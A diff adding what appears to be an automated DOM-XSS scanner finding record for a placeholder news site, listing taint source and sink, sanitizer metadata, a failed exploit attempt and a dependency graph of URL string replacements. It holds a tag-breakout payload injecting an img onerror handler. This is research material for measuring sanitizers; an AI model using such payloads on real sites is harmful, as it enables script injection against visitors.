@@ -1,0 +1,117 @@
+// Finding: 977cb254-6ec7-4537-a27c-a0c14db99114
+// Finding.url: https://www.example91.com/animated_features/space-jam-a-new-legacy-reveals-its-goon-squad-headlined-by-anthony-davis-damian-lillard-klay-thompson-a184766#on-a184766%23gs.0t8uae"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('af0374ba36694464bc3934f040de9b93')><!--/*
+// Finding.parentloc: https://www.example91.com/animated_features/space-jam-a-new-legacy-reveals-its-goon-squad-headlined-by-anthony-davis-damian-lillard-klay-thompson-a184766#on-a184766%23gs.0t8uae"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('af0374ba36694464bc3934f040de9b93')><!--/*
+// Finding.domain: www.example91.com
+// Finding.base_domain: example91.com
+// Finding.source: location.href
+// Finding.sink: insertAdjacentHTML
+// Sanitizer.score: 1
+// Sanitizer.name: et
+// Sanitizer.location: https://fast.example7.com/client/2105/13141925/min/v1_gs_lib.js - et:1:31519
+// Finding.begin: 13680
+// Finding.end: 13710
+// Finding.original_uuid: 6ac8bfea-f2d0-4132-be02-5d2dd78d798b
+// Finding.TwentyFiveMillionFlowsId: 640609304
+// Finding.script: https://fast.example7.com/client/2105/13141925/min/v1_gs_lib.js
+// Finding.line: 3
+// Exploit.uuid: af0374ba-3669-4464-bc39-34f040de9b93
+// Exploit.success: false
+// Exploit.status: failure
+// Exploit.method: C
+// Exploit.type: html
+// Exploit.token: attribute
+// Exploit.content: src
+// Exploit.quote_type: "
+// Exploit.tag: iframe
+// Exploit.break_out: on-a184766%23gs.0t8uae"></iframe></style></script></object></embed></textarea><img src=x onerror=
+// Exploit.break_in: ><!--/*
+// Exploit.payload: on-a184766%23gs.0t8uae"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog(1)><!--/*
+// Exploit.begin_taint_url: 0
+// Exploit.end_taint_url: 168
+// Exploit.replace_begin_url: 159
+// Exploit.replace_end_url: 168
+// Exploit.replace_begin_param: 259
+// Exploit.replace_end_param: 281
+// Issues.LargestEncodeAttrStringChain: 0
+// Issues.LargestTextFragmentEncodeChainLength: 0
+// Issues.HasApproximation: false
+// Issues.HasMissingImplementation: false
+// Issues.HasInfiniteRegexWithFunctionReplacer: false
+// Issues.MergedSplitAndJoins: false
+// Issues.HasUrlInRhsOfReplace: true
+// Issues.HasUrlInLhsOfReplace: true
+// Issues.HasCookieValueInLhsOfreplace: false
+// Issues.HasCookieValueInRhsOfreplace: false
+// Issues.HasCookieValueInMatchPattern: false
+// Issues.HasCookieValueInExecPattern: false
+// Issues.RemovedLRConcats: false
+// Issues.RemovedReplaceArtifacts: false
+// Issues.HasUrlInMatchPattern: false
+// Issues.HasUrlInExecPattern: false
+// Issues.RemovedNOPreplaces: false
+// Issues.Known_sanitizer: false
+// DepGraph.hash: -1967288839
+// DepGraph.sanitizer_hash: 1612460264
+// Part of the URL ('#on-a184766%23gs.0t8uae"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('af0374ba36694464bc3934f040de9b93')><!--/*') found in left hand side of replace 
+// Part of the URL ('#on-a184766%23gs.0t8uae') found in right hand side of replace 
+// Part of the URL ('/animated_features/space-jam-a-new-legacy-reveals-its-goon-squad-headlined-by-anthony-davis-damian-lillard-klay-thompson-a184766#on-a184766%23gs.0t8uae') found in left hand side of replace 
+// Part of the URL ('#on-a184766%23gs.0t8uae') found in left hand side of replace 
+digraph cfg {
+n0 [shape=house, label="Input: x"];
+n1 [shape=ellipse, label="str_replace_once"];
+n2 [shape=box, label="Lit: #on-a184766%23gs.0t8uae"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('af0374ba36694464bc3934f040de9b93')><!--/*"];
+n3 [shape=box, label="Lit: #on-a184766%23gs.0t8uae"];
+n4 [shape=box, label="Var: x"];
+n5 [shape=ellipse, label="str_replace_once"];
+n6 [shape=box, label="Lit: /animated_features/space-jam-a-new-legacy-reveals-its-goon-squad-headlined-by-anthony-davis-damian-lillard-klay-thompson-a184766#on-a184766%23gs.0t8uae"];
+n7 [shape=box, label="Lit: "];
+n8 [shape=box, label="Var: x"];
+n9 [shape=ellipse, label="str_replace_once"];
+n10 [shape=box, label="Lit: #on-a184766%23gs.0t8uae"];
+n11 [shape=box, label="Lit: "];
+n12 [shape=box, label="Var: x"];
+n13 [shape=ellipse, label="decodeURIComponent"];
+n14 [shape=box, label="Var: x"];
+n15 [shape=ellipse, label="preg_replace"];
+n16 [shape=box, label="RegExp: /\u00AD/"];
+n17 [shape=box, label="Lit: %C2%AD"];
+n18 [shape=box, label="Var: x"];
+n19 [shape=ellipse, label="str_replace_once"];
+n20 [shape=box, label="RegExp: /#gs\.(.)*/"];
+n21 [shape=box, label="Lit: "];
+n22 [shape=box, label="Var: x"];
+n23 [shape=ellipse, label="str_replace_once"];
+n24 [shape=box, label="Lit: &"];
+n25 [shape=box, label="Lit: ?"];
+n26 [shape=box, label="Var: x"];
+n27 [shape=box, label="Var: x"];
+n28 [shape=doubleoctagon, label="Return: x"];
+n4 -> n0;
+n1 -> n2;
+n1 -> n3;
+n1 -> n4;
+n8 -> n1;
+n5 -> n6;
+n5 -> n7;
+n5 -> n8;
+n12 -> n5;
+n9 -> n10;
+n9 -> n11;
+n9 -> n12;
+n14 -> n9;
+n13 -> n14;
+n18 -> n13;
+n15 -> n16;
+n15 -> n17;
+n15 -> n18;
+n22 -> n15;
+n19 -> n20;
+n19 -> n21;
+n19 -> n22;
+n26 -> n19;
+n23 -> n24;
+n23 -> n25;
+n23 -> n26;
+n27 -> n23;
+n28 -> n27;
+}
